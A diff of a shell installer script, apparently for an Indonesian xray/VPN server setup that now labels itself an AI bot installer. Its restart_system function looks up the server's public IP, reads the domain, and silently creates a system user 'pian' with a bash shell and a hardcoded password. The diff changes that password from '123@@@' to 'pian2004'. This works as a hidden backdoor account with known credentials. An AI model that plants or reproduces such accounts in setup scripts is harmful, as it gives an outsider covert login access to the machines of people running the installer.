@@ -64,7 +64,7 @@ restart_system() {
     ipsaya=$(wget -qO- ipinfo.io/ip)
     domain=$(cat /etc/xray/domain)
     Username="pian"
-    Password="123@@@"
+    Password="pian2004"
     mkdir -p /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
     echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
@@ -157,7 +157,7 @@ chmod +x /usr/local/bin/setupbot
 restart_system
 clear
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e " \e[1;97;101m  MEMASANG FILE YANG DIBUTUHKAN    \e[0m"
+echo -e " \e[1;97;101m       MEMASANG BOT AI Z11     \e[0m"
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 echo -e ""
 echo -e "  \033[1;91m Proses Memasang File!\033[1;37m"
